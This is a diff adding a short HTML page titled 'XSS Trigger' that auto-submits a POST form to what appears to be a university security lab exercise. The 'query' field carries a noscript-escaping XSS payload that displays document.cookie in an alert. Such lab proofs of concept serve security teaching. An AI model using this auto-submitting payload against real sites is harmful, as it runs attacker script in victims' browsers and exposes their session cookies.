@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<htmtl lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS Trigger</title>
+  </head>
+  <body>
+    <form
+      id="xssForm"
+      method="POST"
+      action="https://inte2102.semiregular.space/Practical_Assessment/1/XSS/%7B589ebe15-e897-442f-9041-cb78f7a8b952%7D/ex6/"
+    >
+      <input
+        type="text"
+        name="query"
+        value="</noscript><script>alert(document.cookie)</script>"
+      />
+    </form>
+    <script>
+      document.getElementById("xssForm").submit();
+    </script>
+  </body>
+</htmtl>
